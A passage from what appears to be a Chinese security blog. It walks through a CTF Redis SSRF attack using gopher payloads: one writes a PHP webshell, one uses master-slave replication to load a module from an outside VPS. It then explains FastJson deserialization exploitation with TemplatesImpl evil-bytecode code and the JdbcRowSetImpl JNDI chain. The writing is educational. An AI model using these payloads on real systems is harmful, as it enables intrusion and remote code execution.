class="line"><span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">cmd+=CRLF+<span class="string">&quot;$&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>((x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>))))+CRLF+x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>)</span><br><span class="line">cmd+=CRLF</span><br><span class="line"><span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">payload += urllib.quote(redis_format(x))</span><br><span class="line"><span class="built_in">print</span> payload</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>利用gopher协议，生成payload</p><p>把生成的payload进行url编码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;cb0f5ef6-1668-4620-a764-3af2cac0b19b.node3.buuoj.cn&#x2F;?url&#x3D;gopher:&#x2F;&#x2F;0.0.0.0:6379&#x2F;_%25%32%41%32%25%30%44%25%30%41%25%32%34%34%25%30%44%25%30%41%41%55%54%48%25%30%44%25%30%41%25%32%34%34%25%30%44%25%30%41%72%6f%6f%74%25%30%44%25%30%41%25%32%41%31%25%30%44%25%30%41%25%32%34%38%25%30%44%25%30%41%66%6c%75%73%68%61%6c%6c%25%30%44%25%30%41%25%32%41%33%25%30%44%25%30%41%25%32%34%33%25%30%44%25%30%41%73%65%74%25%30%44%25%30%41%25%32%34%31%25%30%44%25%30%41%31%25%30%44%25%30%41%25%32%34%33%32%25%30%44%25%30%41%25%30%41%25%30%41%25%33%43%25%33%46%70%68%70%25%32%30%73%79%73%74%65%6d%25%32%38%25%32%32%63%61%74%25%32%30%2f%66%6c%61%67%25%32%32%25%32%39%25%33%42%25%33%46%25%33%45%25%30%41%25%30%41%25%30%44%25%30%41%25%32%41%34%25%30%44%25%30%41%25%32%34%36%25%30%44%25%30%41%63%6f%6e%66%69%67%25%30%44%25%30%41%25%32%34%33%25%30%44%25%30%41%73%65%74%25%30%44%25%30%41%25%32%34%33%25%30%44%25%30%41%64%69%72%25%30%44%25%30%41%25%32%34%31%33%25%30%44%25%30%41%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%25%30%44%25%30%41%25%32%41%34%25%30%44%25%30%41%25%32%34%36%25%30%44%25%30%41%63%6f%6e%66%69%67%25%30%44%25%30%41%25%32%34%33%25%30%44%25%30%41%73%65%74%25%30%44%25%30%41%25%32%34%31%30%25%30%44%25%30%41%64%62%66%69%6c%65%6e%61%6d%65%25%30%44%25%30%41%25%32%34%39%25%30%44%25%30%41%73%68%65%6c%6c%2e%70%68%70%25%30%44%25%30%41%25%32%41%31%25%30%44%25%30%41%25%32%34%34%25%30%44%25%30%41%73%61%76%65%25%30%44%25%30%41</span><br></pre></td></tr></table></figure><p>写入成功，得到flag</p><p><img src="https://www.hualigs.cn/image/6086b21e63d5c.jpg"></p><h1 id="主从复制rce"><a href="#主从复制rce" class="headerlink" title="主从复制rce"></a>主从复制rce</h1><p>在docker环境下，一个单一的容器中不会有除redis以外的任何服务存在，如ssh和crontab，再加上权限的严格控制，只靠写文件就很难再getshell了，在这种情况下可以利用主从复制执行命令。</p><p><strong>主从复制概念</strong></p><p>主从复制，是指将一台Redis服务器的数据，复制到其他的Redis服务器。前者称为主节点(master)，后者称为从节点(slave)；数据的复制是单向的，只能由主节点到从节点。建立主从关系只需要在从节点操作就行了，主节点不用任何操作。</p><p><strong>主从复制作用</strong></p><p>Redis是一个使用ANSI  C编写的开源、支持网络、基于内存、可选持久性的键值对存储数据库。但如果当把数据存储在单个Redis的实例中，当读写体量比较大的时候，服务端就很难承受。为了应对这种情况，Redis就提供了主从模式，主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>还是以[网鼎杯 2020 玄武组]SSRFMe为例</p><p>需要先下载两个工具</p><p><a href="https://github.com/xmsec/redis-ssrf">https://github.com/xmsec/redis-ssrf</a> </p><p><a href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a></p><p>实际用到的只有第一个链接中的<code>rogue-server.py</code>和<code>ssrf-redis.py</code>，还有第二个链接中的<code>exp.so</code>，把这三个文件放到一个文件夹里即可</p><p>修改ssrf-redis.py中的一些参数</p><p>lhost改为vps地址，6666端口为<code>rogue-server.py</code>的运行端口，command为要执行的命令</p><p><img src="https://www.hualigs.cn/image/6086b21e6139f.jpg"></p><p>ip改为符合要求的0.0.0.0</p><p><img src="https://www.hualigs.cn/image/6086b21e55ef0.jpg"></p><p>密码改为root</p><p><img src="https://www.hualigs.cn/image/6086b21e568de.jpg"></p><p>生成payload</p><p><img src="https://www.hualigs.cn/image/6086b21e71a9a.jpg"></p><p>运行rogue-server.py，建立从节点</p><p><img src="https://www.hualigs.cn/image/6086b21e662b0.jpg"></p><p>将生成的payload进行url编码后访问，得到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;44677c4e-0255-433c-aa69-f1ebedb79c08.node3.buuoj.cn&#x2F;?url&#x3D;gopher:&#x2F;&#x2F;0.0.0.0:6379&#x2F;_%25%32%41%32%25%30%44%25%30%41%25%32%34%34%25%30%44%25%30%41%41%55%54%48%25%30%44%25%30%41%25%32%34%34%25%30%44%25%30%41%72%6f%6f%74%25%30%44%25%30%41%25%32%41%33%25%30%44%25%30%41%25%32%34%37%25%30%44%25%30%41%53%4c%41%56%45%4f%46%25%30%44%25%30%41%25%32%34%31%35%25%30%44%25%30%41%31%31%38%2e%31%39%35%2e%31%36%36%2e%31%33%38%25%30%44%25%30%41%25%32%34%34%25%30%44%25%30%41%36%36%36%36%25%30%44%25%30%41%25%32%41%34%25%30%44%25%30%41%25%32%34%36%25%30%44%25%30%41%43%4f%4e%46%49%47%25%30%44%25%30%41%25%32%34%33%25%30%44%25%30%41%53%45%54%25%30%44%25%30%41%25%32%34%33%25%30%44%25%30%41%64%69%72%25%30%44%25%30%41%25%32%34%35%25%30%44%25%30%41%2f%74%6d%70%2f%25%30%44%25%30%41%25%32%41%34%25%30%44%25%30%41%25%32%34%36%25%30%44%25%30%41%63%6f%6e%66%69%67%25%30%44%25%30%41%25%32%34%33%25%30%44%25%30%41%73%65%74%25%30%44%25%30%41%25%32%34%31%30%25%30%44%25%30%41%64%62%66%69%6c%65%6e%61%6d%65%25%30%44%25%30%41%25%32%34%36%25%30%44%25%30%41%65%78%70%2e%73%6f%25%30%44%25%30%41%25%32%41%33%25%30%44%25%30%41%25%32%34%36%25%30%44%25%30%41%4d%4f%44%55%4c%45%25%30%44%25%30%41%25%32%34%34%25%30%44%25%30%41%4c%4f%41%44%25%30%44%25%30%41%25%32%34%31%31%25%30%44%25%30%41%2f%74%6d%70%2f%65%78%70%2e%73%6f%25%30%44%25%30%41%25%32%41%32%25%30%44%25%30%41%25%32%34%31%31%25%30%44%25%30%41%73%79%73%74%65%6d%2e%65%78%65%63%25%30%44%25%30%41%25%32%34%31%34%25%30%44%25%30%41%63%61%74%25%32%34%25%37%42%49%46%53%25%37%44%2f%66%6c%61%67%25%30%44%25%30%41%25%32%41%31%25%30%44%25%30%41%25%32%34%34%25%30%44%25%30%41%71%75%69%74%25%30%44%25%30%41</span><br></pre></td></tr></table></figure><p><img src="https://www.hualigs.cn/image/6086b21e68121.jpg"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>FastJson反序列化</title>
    <link href="/2021/04/25/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2021/04/25/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="Fastjson使用"><a href="#Fastjson使用" class="headerlink" title="Fastjson使用"></a>Fastjson使用</h1><p>astjson是Alibaba开发的Java语言编写的高性能JSON库，用于将数据在JSON和Java  Object之间互相转换，提供两个主要接口JSON.toJSONString和JSON.parseObject/JSON.parse来分别实现序列化和反序列化操作。</p><p>pom.xml设置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;com.alibaba&lt;&#x2F;groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;fastjson&lt;&#x2F;artifactId&gt;</span><br><span class="line">            &lt;version&gt;1.2.24&lt;&#x2F;version&gt;</span><br><span class="line">        &lt;&#x2F;dependency&gt;</span><br></pre></td></tr></table></figure><p>先定义一个User类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>FastJson反序列化有三种方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        User user=<span class="keyword">new</span> User();</span><br><span class="line">        user.setName(<span class="string">&quot;admin&quot;</span>);</span><br><span class="line">        user.setAge(<span class="number">14</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        String serializedStr=JSON.toJSONString(user);</span><br><span class="line">        System.out.println(serializedStr);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        Object obj1=JSON.parse(serializedStr);</span><br><span class="line">        System.out.println(<span class="string">&quot;通过parse方法反序列化&quot;</span>);</span><br><span class="line">        System.out.println(obj1.getClass().getName());</span><br><span class="line">        System.out.println(obj1);</span><br><span class="line"></span><br><span class="line">        Object obj2=JSON.parseObject(serializedStr);</span><br><span class="line">        System.out.println(<span class="string">&quot;通过parseObject方法，不指定类进行反序列化&quot;</span>);</span><br><span class="line">        System.out.println(obj2.getClass().getName());</span><br><span class="line">        System.out.println(obj2);</span><br><span class="line"></span><br><span class="line">        Object obj3=JSON.parseObject(serializedStr,User.class);</span><br><span class="line">        System.out.println(<span class="string">&quot;通过parseObject方法，指定User类进行反序列化&quot;</span>);</span><br><span class="line">        System.out.println(obj3.getClass().getName());</span><br><span class="line">        System.out.println(obj3);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>执行结果如下</p><p><img src="https://www.hualigs.cn/image/608577ba949d7.jpg"></p><p>可以看到<code>JSON.parse</code>和未指定对象的<code>JSON.parseObject</code>都会返回<code>JSONObject</code>，而<code>JSON.parseObject</code>指定类后会返回相应的类对象。它们不仅返回结果不同，执行过程中调用的方法也不同。</p><h1 id="type字段"><a href="#type字段" class="headerlink" title="type字段"></a>type字段</h1><p>修改User类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getName&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setName&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getAge&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setAge&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> FastJson中有一个特殊字段<code>type</code>，这个字段可以指定反序列化任意类，并且会自动调用类中符合规则的特定的<code>setter</code>和<code>getter</code>方法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">parse(&quot;&quot;) 会识别并调用目标类的特定 setter 方法及某些特定条件的 getter 方法</span><br><span class="line"></span><br><span class="line">parseObject(&quot;&quot;) 会调用反序列化目标类的特定 setter 和 getter 方法</span><br><span class="line"></span><br><span class="line">parseObject(&quot;&quot;,class) 会识别并调用目标类的特定 setter 方法及某些特定条件的 getter 方法</span><br></pre></td></tr></table></figure><p>规则</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">set开头的方法要求如下：</span><br><span class="line">- 方法名长度大于4且以set开头，且第四个字母要是大写</span><br><span class="line">- 非静态方法</span><br><span class="line">- 返回类型为void或当前类</span><br><span class="line">- 参数个数为1个</span><br><span class="line">get开头的方法要求如下：</span><br><span class="line">- 方法名长度大于等于4        </span><br><span class="line">- 非静态方法</span><br><span class="line">- 以get开头且第4个字母为大写</span><br><span class="line">- 无传入参数</span><br><span class="line">- 返回值类型继承自Collection Map AtomicBoolean AtomicInteger AtomicLong</span><br></pre></td></tr></table></figure><p>Demo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        String jsonstring=<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;User\&quot;,\&quot;age\&quot;:80,\&quot;name\&quot;:\&quot;admin\&quot;&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;parse:&quot;</span>);</span><br><span class="line">        Object obj1=JSON.parse(jsonstring);</span><br><span class="line">        System.out.println(obj1.getClass().getName());</span><br><span class="line">        System.out.println(obj1);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;parseObject:&quot;</span>);</span><br><span class="line">        Object obj2=JSON.parseObject(jsonstring);</span><br><span class="line">        System.out.println(obj2.getClass().getName());</span><br><span class="line">        System.out.println(obj2);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;parseObject with class:&quot;</span>);</span><br><span class="line">        Object obj3=JSON.parseObject(jsonstring,User.class);</span><br><span class="line">        System.out.println(obj3.getClass().getName());</span><br><span class="line">        System.out.println(obj3);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果</p><p><img src="https://www.hualigs.cn/image/608577baaece0.jpg"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">type可以指定反序列化成服务器上的任意类</span><br><span class="line"></span><br><span class="line">然后服务端会解析这个类，提取出这个类中符合要求的setter方法与getter方法（如setxxx）</span><br><span class="line"></span><br><span class="line">如果传入json字符串的键值中存在这个值（如xxx)，就会去调用执行对应的setter、getter方法（即setxxx方法、getxxx方法）</span><br></pre></td></tr></table></figure><h1 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h1><h2 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h2><p>基于JDK 7u21 Gadgets，1.7版本通用，利用条件苛刻</p><p>利用条件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. 服务端使用parseObject()时，必须使用如下格式才能触发漏洞：</span><br><span class="line">    &#96;JSON.parseObject(input, Object.class, Feature.SupportNonPublicField);&#96;</span><br><span class="line">2. 服务端使用parse()时，需要&#96;JSON.parse(text1,Feature.SupportNonPublicField);&#96;</span><br></pre></td></tr></table></figure><p>jdk7u21反序列化的利用条件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.恶意类的父类必须为ABSTRACT_TRANSLET </span><br><span class="line">2.TemplatesImpl类的_bytecodes不为null，为恶意类字节码，payload写在恶意类的静态方法或构造方法</span><br><span class="line">3.TemplatesImpl类的_name不为null</span><br><span class="line">4.TemplatesImpl类的_class&#x3D;null</span><br><span class="line">5._tfactory需要是一个拥有getExternalExtensionsMap()方法的类，即TransformerFactoryImpl()，以此来兼容不同版本</span><br></pre></td></tr></table></figure><p>构造exp，FastJson反序列化过程中对<code>_bytecodes</code>、<code>_tfactory</code>等属性进行了操作，需要另外处理</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.codec.binary.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] getevilbyte() <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        CtClass ctClass = pool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//向静态方法中插入要执行的命令</span></span><br><span class="line">        ctClass.makeClassInitializer().insertBefore(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//设置满足条件的父类</span></span><br><span class="line">        ctClass.setSuperclass((pool.get(AbstractTranslet.class.getName())));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取字节码</span></span><br><span class="line">        <span class="keyword">byte</span>[] EvilByteCodes = ctClass.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> EvilByteCodes;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span>  Exception </span>&#123;</span><br><span class="line">        <span class="comment">//生成恶意类字节码</span></span><br><span class="line">        <span class="keyword">byte</span>[] evilCode = getevilbyte();</span><br><span class="line">        <span class="comment">//将字节码进行base64编码</span></span><br><span class="line">        String evilCode_base64 = Base64.encodeBase64String(evilCode);</span><br><span class="line">        String text1 = <span class="string">&quot;&#123;&quot;</span>+</span><br><span class="line">                <span class="string">&quot;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,&quot;</span>+</span><br><span class="line">                <span class="string">&quot;\&quot;_bytecodes\&quot;:[\&quot;&quot;</span>+evilCode_base64+<span class="string">&quot;\&quot;],&quot;</span>+</span><br><span class="line">                <span class="string">&quot;&#x27;_name&#x27;:&#x27;xx&#x27;,&quot;</span>+</span><br><span class="line">                <span class="string">&quot;&#x27;_tfactory&#x27;:&#123; &#125;,&quot;</span>+</span><br><span class="line">                <span class="string">&quot;&#x27;_outputProperties&#x27;:&#123; &#125;&quot;</span>+</span><br><span class="line">                <span class="string">&quot;&#125;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">        System.out.println(text1);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//处理private属性</span></span><br><span class="line">        ParserConfig config = <span class="keyword">new</span> ParserConfig();</span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="bytecodes"><a href="#bytecodes" class="headerlink" title="_bytecodes"></a>_bytecodes</h3><p><code>_bytecodes</code>传输过程中会经过base64解码，所以在payload中需要进行base64编码</p><p>FieldDeserializer#parseField</p><p><code>parseField</code>中对<code>_bytecodes</code>中的内容进行了解析</p><p><img src="https://www.hualigs.cn/image/608577bdaf53a.jpg"></p><p><code>deserialize</code></p><p><img src="https://www.hualigs.cn/image/608577bd7b350.jpg"></p><p><code>parseArray</code></p><p><img src="https://www.hualigs.cn/image/608577bd7b350.jpg"></p><p><code>ObjectDeserializer#deserializer</code></p><p><img src="https://www.hualigs.cn/image/608577bd8fdbc.jpg"></p><p><code>byteValue</code></p><p>对<code>_bytecodes</code>进行base64解码</p><p><img src="https://www.hualigs.cn/image/608577bd93675.jpg"></p><p><img src="https://www.hualigs.cn/image/608577bda1ec4.jpg"></p><h3 id="tfactory"><a href="#tfactory" class="headerlink" title="_tfactory"></a>_tfactory</h3><p>FastJson会自动新建一个符合要求的对象实例，所以exp中<code>_factory</code>为<code>&#123;&#125;</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;com&#x2F;alibaba&#x2F;fastjson&#x2F;parser&#x2F;deserializer&#x2F;JavaBeanDeserializer.java</span><br></pre></td></tr></table></figure><p><img src="https://www.hualigs.cn/image/608577be6fc06.jpg"></p><h2 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h2><p>前面提到了FastJson反序列化会自动调用类中符合规则的特定的<code>setter</code>和<code>getter</code>方法。<code>com.sun.rowset.JdbcRowSetImp</code>l的<code>setAutoCommit()</code>方法中调用了l<code>ookup()</code>，且参数<code>DataSourceName</code>可控，由<code>setDataSourceName()</code>方法设置。由于这两个方法都符合规则，反序列化时自动调用这两个<code>setter</code>方法造成JNDI注入，进而触发命令执行。</p><p>JdbcRowSetImpl#setDataSourceName</p><p>调用父类的<code>setDataSourceName</code></p><p><img src="https://www.hualigs.cn/image/608577bce87af.jpg"></p><p>BaseRowSet#<code>setDataSourceName</code></p><p>父类的<code>setDataSourceName</code>，把<code>var1</code>赋值给<code>dataSoruce</code></p><p><img src="https://www.hualigs.cn/image/608577bcc6881.jpg"></p><p><code>setAutoCommit</code></p><p>这里调用了<code>connect()</code>方法，<code>var1</code>来源于POC中构造的属性<code>autoCommit</code>，实际测试中发现这个值可以是true也可以是false，只要保证有一个布尔类型的参数传入就不会影响正常执行。</p><p><img src="https://www.hualigs.cn/image/608577bd10f67.jpg"></p><p><code>connection</code></p><p>调用<code>lookup</code>，<code>this.getDataSourceName()</code>等于<code>var1</code>，接着请求我们的ldap服务器，触发命令执行</p><p><img src="https://www.hualigs.cn/image/608577bc56bb3.jpg"></p><p><img src="https://www.hualigs.cn/image/608577bc6121c.jpg"></p><p>接下来就是JNDI注入利用的思路了</p><p>使用marshalsec搭建ldap服务器</p><figure class="highlight 